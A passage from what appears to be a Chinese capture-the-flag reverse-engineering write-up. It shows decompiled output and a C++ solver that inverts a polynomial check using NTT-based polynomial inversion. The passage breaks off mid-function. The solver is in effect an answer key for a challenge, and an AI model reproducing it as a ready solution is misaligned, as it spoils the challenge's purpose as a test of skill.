<span><span style="color: #4876D6">FUN_001014be</span><span style="color: #403F53">(b,n </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i3 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i3 </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> n </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">; i3 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> i3 </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) {</span></span>
<span><span style="color: #403F53">    mint::operator</span><span style="color: #994CC3">*=</span><span style="color: #403F53">((mint </span><span style="color: #994CC3">*</span><span style="color: #403F53">)((</span><span style="color: #994CC3">long</span><span style="color: #403F53">)a </span><span style="color: #994CC3">+</span><span style="color: #403F53"> (</span><span style="color: #994CC3">long</span><span style="color: #403F53">)i3 </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">),</span></span>
<span><span style="color: #403F53">                    </span><span style="color: #4876D6">SUB41</span><span style="color: #403F53">(</span><span style="color: #994CC3">*</span><span style="color: #403F53">(undefined4 </span><span style="color: #994CC3">*</span><span style="color: #403F53">)((</span><span style="color: #994CC3">long</span><span style="color: #403F53">)i3 </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53"> </span><span style="color: #994CC3">+</span><span style="color: #403F53"> (</span><span style="color: #994CC3">long</span><span style="color: #403F53">)b),</span><span style="color: #AA0982">0</span><span style="color: #403F53">));</span></span>
<span><span style="color: #403F53">}</span></span>
<span><span style="color: #4876D6">FUN_00101627</span><span style="color: #403F53">(a,n </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span></code></pre></div></section>
<p>求逆然后乘起来即可<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="C++ 代码块" data-v-ad49d235>C++</h5><ile-root id="ile-32"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-32--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">algorithm</span><span style="color: #D9F5DD">&gt;</span></span>
<span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">cstring</span><span style="color: #D9F5DD">&gt;</span></span>
<span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">iostream</span><span style="color: #D9F5DD">&gt;</span></span>
<span></span>
<span><span style="color: #C792EA">using</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">namespace</span><span style="color: #D6DEEB"> std;</span></span>
<span></span>
<span><span style="color: #C792EA">typedef</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">long</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">long</span><span style="color: #D6DEEB"> ll;</span></span>
<span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> mod </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">998244353</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> N </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> G </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">3</span><span style="color: #D6DEEB">;</span></span>
<span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> n, </span><span style="color: #C5E478">r</span><span style="color: #D6DEEB">[N </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">];</span></span>
<span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">c</span><span style="color: #D6DEEB">[N </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> {</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0000270c</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0000429c</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0000675b</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00007f8a</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0000a59b</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0000c1cd</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0000f6cb</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00010e02</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00012f88</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00014c8b</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00015525</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00018924</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0001a398</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0001b545</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0001c2af</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0002018c</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0001fdd4</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00023333</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00026068</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00029557</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00028aef</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0002a872</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0002e6e4</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0002ee5e</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00030a9d</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00030cee</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00033ec0</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0003629a</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00037487</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00039d4e</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0003e2f7</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0003eccf</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0004304b</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00045d64</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0004715e</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0004c474</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0004ea5e</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0004f081</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0004fe29</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00052656</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00053dc1</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0005355a</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00054bb5</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0005560c</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0005296c</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0005523e</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00054cba</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00053930</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0005265f</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">000552f2</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0005316a</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00053e95</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00055823</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">000564b7</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00052cdc</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00051228</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00055f28</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00054d58</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0005454b</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00052f57</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00054d6f</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00053e11</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00055f91</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00055a50</span><span style="color: #D6DEEB">};</span></span>
<span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">char</span><span style="color: #D6DEEB"> s[] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">welcome to the world of polynomial</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">a</span><span style="color: #D6DEEB">[N </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">], </span><span style="color: #C5E478">b</span><span style="color: #D6DEEB">[N </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">], </span><span style="color: #C5E478">aa</span><span style="color: #D6DEEB">[N </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">], </span><span style="color: #C5E478">bb</span><span style="color: #D6DEEB">[N </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">];</span></span>
<span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">qpow</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">x</span><span style="color: #D6DEEB">, </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">y</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> out </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> (y)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (y </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">            out </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)out </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> x </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">        x </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)x </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> x </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">        y </span><span style="color: #C792EA">&gt;&gt;=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> out;</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span></span>
<span><span style="color: #C792EA">void</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">ntt</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D7DBE0">A</span><span style="color: #D6DEEB">, </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">type</span><span style="color: #D6DEEB">, </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">L</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> i, j, k, wn, w, t;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> L; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">r</span><span style="color: #D6DEEB">[i])</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #82AAFF">swap</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[i], </span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[</span><span style="color: #C5E478">r</span><span style="color: #D6DEEB">[i]]);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> L; i </span><span style="color: #C792EA">&lt;&lt;=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        wn </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">qpow</span><span style="color: #D6DEEB">(G, (mod </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">/</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">));</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (j </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; j </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> L; j </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        {</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (k </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">, w </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">; k </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> i; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">k, w </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)w </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> wn </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod)</span></span>
<span><span style="color: #D6DEEB">            {</span></span>
<span><span style="color: #D6DEEB">                t </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)</span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k] </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> w </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k] </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> t </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> mod) </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k] </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> t) </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">            }</span></span>
<span><span style="color: #D6DEEB">        }</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (type </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #82AAFF">reverse</span><span style="color: #D6DEEB">(A </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, A </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> L);</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> inv </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">qpow</span><span style="color: #D6DEEB">(L, mod </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> L; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)</span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> inv </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span></span>
<span><span style="color: #C792EA">void</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">polyinv</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">L</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (L </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">b</span><span style="color: #D6DEEB">[</span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">qpow</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">a</span><span style="color: #D6DEEB">[</span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">], mod </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> i;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">polyinv</span><span style="color: #D6DEEB">(L </span><span style="color: #C792EA">&gt;&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">memset</span><span style="color: #D6DEEB">(bb, </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">, </span><span style="color: #7FDBCA">sizeof</span><span style="color: #D6DEEB">(bb));</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">memcpy</span><span style="color: #D6DEEB">(bb, b, </span><span style="color: #7FDBCA">sizeof</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> (L </span><span style="color: #C792EA">&gt;&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">));</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">memcpy</span><span style="color: #D6DEEB">(aa, a, </span><span style="color: #7FDBCA">sizeof</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> L);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> (L </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">); </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">r</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #C5E478">r</span><span style="color: #D6DEEB">[i </span><span style="color: #C792EA">&gt;&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">] </span><span style="color: #C792EA">&gt;&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">|</span><span style="color: #D6DEEB"> ((i </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> L);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">ntt</span><span style="color: #D6DEEB">(aa, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, L </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">ntt</span><span style="color: #D6DEEB">(bb, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, L </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> (L </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">); </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">aa</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)</span><span style="color: #C5E478">aa</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">bb</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">bb</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
